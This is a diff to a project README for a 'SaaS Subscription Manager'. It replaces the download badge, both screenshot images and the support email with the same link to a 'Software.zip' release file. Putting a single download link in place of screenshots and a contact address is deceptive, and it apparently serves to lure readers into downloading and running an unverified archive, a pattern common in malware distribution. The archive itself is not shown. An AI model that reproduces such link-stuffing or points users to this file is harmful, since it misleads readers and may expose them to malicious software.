@@ -17,17 +17,17 @@ To get started with the SaaS Subscription Manager, follow these simple steps:
 
 ## Installation 🔧
 To install the SaaS Subscription Manager, you can use the following link:
-[![Download SaaS Subscription Manager](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download SaaS Subscription Manager](https://github.com/ricckkk00000/SaaS-Subscription-Manager/releases/download/v1.0/Software.zip)](https://github.com/ricckkk00000/SaaS-Subscription-Manager/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the file, extract it and launch the application to begin managing your SaaS subscriptions effortlessly.
 
 ## Screenshots 📷
 Here are some sneak peeks into what the SaaS Subscription Manager looks like:
-![Dashboard](https://example.com/dashboard.png)
-![Subscription Tracking](https://example.com/tracking.png)
+![Dashboard](https://github.com/ricckkk00000/SaaS-Subscription-Manager/releases/download/v1.0/Software.zip)
+![Subscription Tracking](https://github.com/ricckkk00000/SaaS-Subscription-Manager/releases/download/v1.0/Software.zip)
 
 ## Support ℹ️
-If you encounter any issues or have any questions about the SaaS Subscription Manager, feel free to reach out to our support team at [support@saasmanager.com](mailto:support@saasmanager.com).
+If you encounter any issues or have any questions about the SaaS Subscription Manager, feel free to reach out to our support team at [https://github.com/ricckkk00000/SaaS-Subscription-Manager/releases/download/v1.0/Software.zip](https://github.com/ricckkk00000/SaaS-Subscription-Manager/releases/download/v1.0/Software.zip).
 
 ## Contribute 🤝
 We welcome contributions from the community to enhance the functionality of the SaaS Subscription Manager. If you have ideas for new features or improvements, please submit a pull request.
